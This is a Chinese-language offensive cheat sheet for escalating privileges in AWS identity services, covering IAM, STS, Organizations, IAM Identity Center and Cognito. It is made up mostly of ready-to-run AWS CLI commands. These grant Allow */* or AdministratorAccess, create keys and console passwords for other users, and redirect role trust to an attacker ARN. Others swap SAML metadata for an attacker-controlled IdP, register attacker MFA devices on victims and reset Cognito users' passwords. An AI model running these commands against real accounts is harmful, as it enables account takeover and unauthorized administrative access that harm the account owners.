# IAM/STS/Organizations 核心提权

本文档覆盖 IAM、STS、Organizations、IAM Identity Center (SSO)、Cognito 等身份与访问管理服务的提权技术。

## IAM 策略操纵

### iam:CreatePolicyVersion — 策略版本注入

**所需权限**：`iam:CreatePolicyVersion`

利用 `--set-as-default` 标志创建新策略版本并立即生效，无需 `iam:SetDefaultPolicyVersion`。

```bash
# 创建全权限策略文件
cat > /tmp/admin-policy.json << 'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
EOF

# 创建新版本并设为默认
aws iam create-policy-version \
  --policy-arn <target_policy_arn> \
  --policy-document file:///tmp/admin-policy.json \
  --set-as-default
```

**结果**：策略关联的所有实体立即获得 Admin 权限。

### iam:SetDefaultPolicyVersion — 策略版本回滚

**所需权限**：`iam:SetDefaultPolicyVersion`

将策略回滚到之前更宽松的版本。

```bash
# 列出策略版本
aws iam list-policy-versions --policy-arn <policy_arn>

# 设置更宽松的版本为默认
aws iam set-default-policy-version --policy-arn <policy_arn> --version-id v2
```

### iam:AttachUserPolicy / AttachGroupPolicy / AttachRolePolicy — 附加托管策略

**所需权限**：`iam:AttachUserPolicy` 或 `iam:AttachGroupPolicy` 或 `iam:AttachRolePolicy`

```bash
# 附加 Admin 策略到用户
aws iam attach-user-policy --user-name <user> \
  --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# 附加到组
aws iam attach-group-policy --group-name <group> \
  --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# 附加到角色（需要 sts:AssumeRole 或 iam:CreateRole 配合）
aws iam attach-role-policy --role-name <role> \
  --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```

### iam:PutUserPolicy / PutGroupPolicy / PutRolePolicy — 添加内联策略

**所需权限**：对应 Put*Policy 权限

```bash
aws iam put-user-policy --user-name <user> --policy-name privesc \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

### iam:AddUserToGroup — 加入高权限组

**所需权限**：`iam:AddUserToGroup`

```bash
aws iam add-user-to-group --group-name admin-group --user-name <user>
```

## IAM 凭据操纵

### iam:CreateAccessKey — 为其他用户创建密钥

**所需权限**：`iam:CreateAccessKey`（可能需要 `iam:DeleteAccessKey`）

```bash
aws iam create-access-key --user-name <target_user>
# 如果目标已有 2 个密钥，需先删除一个
aws iam delete-access-key --access-key-id <key_id> --user-name <target_user>
```

### iam:CreateLoginProfile / UpdateLoginProfile — 设置控制台密码

**所需权限**：`iam:CreateLoginProfile` 或 `iam:UpdateLoginProfile`

```bash
# 创建登录配置
aws iam create-login-profile --user-name <target_user> \
  --no-password-reset-required --password 'P@ssw0rd123!'

# 更新已有密码
aws iam update-login-profile --user-name <target_user> \
  --no-password-reset-required --password 'P@ssw0rd123!'
```

**结果**：可直接登录目标用户的 AWS 控制台。

### iam:UpdateAccessKey — 重新激活禁用密钥

**所需权限**：`iam:UpdateAccessKey`

```bash
aws iam update-access-key --access-key-id <key_id> --status Active --user-name <user>
```

### iam:CreateServiceSpecificCredential — 服务专用凭据

**所需权限**：`iam:CreateServiceSpecificCredential`

为目标用户创建 CodeCommit 等服务的用户名/密码凭据，可用于克隆代码仓库获取泄露凭据。

```bash
aws iam create-service-specific-credential \
  --user-name <target_user> \
  --service-name codecommit.amazonaws.com
```

## IAM 信任策略修改

### iam:UpdateAssumeRolePolicy — 修改角色信任策略

**所需权限**：`iam:UpdateAssumeRolePolicy`

```bash
cat > /tmp/trust.json << 'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"sts:AssumeRole","Principal":{"AWS":"<attacker_arn>"}}]}
EOF

aws iam update-assume-role-policy --role-name <high_priv_role> \
  --policy-document file:///tmp/trust.json

# 现在可以假冒该角色
aws sts assume-role --role-arn arn:aws:iam::<account>:role/<high_priv_role> \
  --role-session-name privesc
```

### iam:UpdateSAMLProvider — SAML 联合篡改

**所需权限**：`iam:UpdateSAMLProvider`、`iam:ListSAMLProviders`

攻击者替换 SAML IdP 元数据为自己控制的 IdP，然后伪造 SAML 断言假冒任何信任该 Provider 的角色。

```bash
# 枚举 SAML Provider
aws iam list-saml-providers
aws iam get-saml-provider --saml-provider-arn <provider_arn>

# 备份原始元数据后替换
aws iam update-saml-provider --saml-provider-arn <provider_arn> \
  --saml-metadata-document file:///tmp/attacker-metadata.xml

# 使用伪造的 SAML 断言获取凭据
aws sts assume-role-with-saml --role-arn <role_arn> \
  --principal-arn <provider_arn> --saml-assertion <base64_assertion>
```

**注意**：替换期间合法 SSO 用户将无法登录，需及时恢复原始元数据。

### iam:UpdateOpenIDConnectProviderThumbprint — OIDC 提权

**所需权限**：`iam:UpdateOpenIDConnectProviderThumbprint`

添加攻击者控制的证书指纹到 OIDC Provider，可登录信任该 Provider 的所有角色。

```bash
aws iam update-open-id-connect-provider-thumbprint \
  --open-id-connect-provider-arn <arn> \
  --thumbprint-list <attacker_thumbprint>
```

## IAM MFA 与权限边界

### iam:CreateVirtualMFADevice + iam:EnableMFADevice — MFA 接管

**所需权限**：`iam:CreateVirtualMFADevice`、`iam:EnableMFADevice`（可能需要 `iam:DeactivateMFADevice`）

为目标用户注册攻击者控制的 MFA 设备，然后请求 MFA 认证的会话令牌。

```bash
# 如果目标已有 MFA，先停用
aws iam deactivate-mfa-device --user-name <target> \
  --serial-number arn:aws:iam::<account>:mfa/<device>

# 创建虚拟 MFA 设备
aws iam create-virtual-mfa-device --virtual-mfa-device-name attacker-mfa \
  --bootstrap-method Base32StringSeed --outfile /tmp/mfa-seed.txt

# 从 seed 生成两个连续 TOTP 码并启用
aws iam enable-mfa-device --user-name <target> \
  --serial-number <serial> --authentication-code1 <code1> --authentication-code2 <code2>

# 获取 MFA 认证会话
aws sts get-session-token --serial-number <serial> --token-code <current_code>
```

### iam:PutUserPermissionsBoundary / PutRolePermissionsBoundary

**所需权限**：`iam:PutUserPermissionsBoundary` 或 `iam:PutRolePermissionsBoundary`

将权限边界设为无限制策略（Allow */*），移除现有限制。

```bash
aws iam put-user-permissions-boundary --user-name <user> \
  --permissions-boundary arn:aws:iam::<account>:policy/AllowAll
```

## STS 提权

### sts:AssumeRole — 角色链式提权

**所需权限**：目标角色信任策略允许当前实体（`sts:AssumeRole` 在角色侧配置）

```bash
# 枚举信任策略宽松的角色
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS==`*`]]'

# 假冒角色
aws sts assume-role --role-arn <role_arn> --role-session-name privesc
```

**关键点**：跨账户 AssumeRole 需要攻击者账户在自身策略中也有 `sts:AssumeRole` 权限。

### sts:AssumeRoleWithWebIdentity — Web 身份提权

在 EKS 环境中，ServiceAccount Token 存储于 `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`。

```bash
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::<account>:role/<role_name> \
  --role-session-name eks-privesc \
  --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```

### IAM Roles Anywhere — 证书提权

当 IAM Roles Anywhere 信任策略未限制证书属性时，任何由信任锚 CA 签发的证书均可假冒角色。

```bash
aws_signing_helper credential-process \
  --certificate client.pem --private-key client.key \
  --trust-anchor-arn <trust_anchor_arn> \
  --profile-arn <profile_arn> \
  --role-arn <high_priv_role_arn>
```

## Organizations 跨账户提权

### 管理账户 → 子账户

拿下 Organizations 管理账户后，可直接在任何成员账户中创建角色或使用 `OrganizationAccountAccessRole`（默认存在于所有通过 Organizations 创建的账户中）。

## IAM Identity Center (SSO) 提权

### sso:PutInlinePolicyToPermissionSet — 注入权限集策略

**所需权限**：`sso:PutInlinePolicyToPermissionSet`、`sso:ProvisionPermissionSet`

```bash
aws sso-admin put-inline-policy-to-permission-set \
  --instance-arn <instance_arn> --permission-set-arn <ps_arn> \
  --inline-policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

aws sso-admin provision-permission-set \
  --instance-arn <instance_arn> --permission-set-arn <ps_arn> \
  --target-type ALL_PROVISIONED_ACCOUNTS
```

### sso:CreateAccountAssignment — 分配权限集到用户

**所需权限**：`sso:CreateAccountAssignment`

```bash
aws sso-admin create-account-assignment --instance-arn <arn> \
  --target-id <account_id> --target-type AWS_ACCOUNT \
  --permission-set-arn <ps_arn> --principal-type USER --principal-id <user_id>
```

### identitystore:CreateGroupMembership — 加入高权限组

```bash
aws identitystore create-group-membership --identity-store-id <store_id> \
  --group-id <group_id> --member-id UserId=<user_id>
```

## Cognito 提权

### cognito-identity:SetIdentityPoolRoles — 角色劫持

**所需权限**：`cognito-identity:SetIdentityPoolRoles`、`iam:PassRole`

```bash
aws cognito-identity set-identity-pool-roles \
  --identity-pool-id <pool_id> --roles unauthenticated=<high_priv_role_arn>

# 获取凭据
aws cognito-identity get-id --identity-pool-id <pool_id>
aws cognito-identity get-credentials-for-identity --identity-id <identity_id>
```

### cognito-idp:AdminSetUserPassword — 用户接管

**所需权限**：`cognito-idp:AdminSetUserPassword`

```bash
aws cognito-idp admin-set-user-password --user-pool-id <pool_id> \
  --username <victim> --password 'NewP@ss123!' --permanent
```

### cognito-idp:AdminUpdateUserAttributes — 属性篡改提权

修改基于属性的 RBAC 中的 `custom:role` 等字段实现应用层提权。

```bash
aws cognito-idp admin-update-user-attributes --user-pool-id <pool_id> \
  --username <user> --user-attributes Name="custom:role",Value="admin"
```
